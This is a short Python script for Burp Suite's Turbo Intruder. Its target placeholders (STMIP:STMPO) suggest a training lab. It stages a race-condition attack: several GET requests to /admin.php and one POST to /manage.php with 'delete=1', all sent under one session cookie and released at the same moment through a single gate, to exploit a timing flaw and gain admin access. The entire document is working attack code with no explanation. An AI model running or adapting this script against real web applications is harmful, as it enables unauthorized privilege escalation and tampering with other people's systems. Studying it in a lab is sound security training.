def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint='http://STMIP:STMPO',
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False
                           )

    admin_req = '''GET /admin.php HTTP/1.1
Host: STMIP:STMPO
Cookie: PHPSESSID=<COOKIE>
Connection: close

'''

    delete_req = '''POST /manage.php HTTP/1.1
Host: STMIP:STMPO
Content-Length: 8
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<COOKIE>
Connection: close

delete=1'''

    engine.queue(admin_req, gate='race1')
    engine.queue(admin_req, gate='race1')
    engine.queue(delete_req, gate='race1')
    engine.queue(admin_req, gate='race1')
    engine.queue(admin_req, gate='race1')


    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)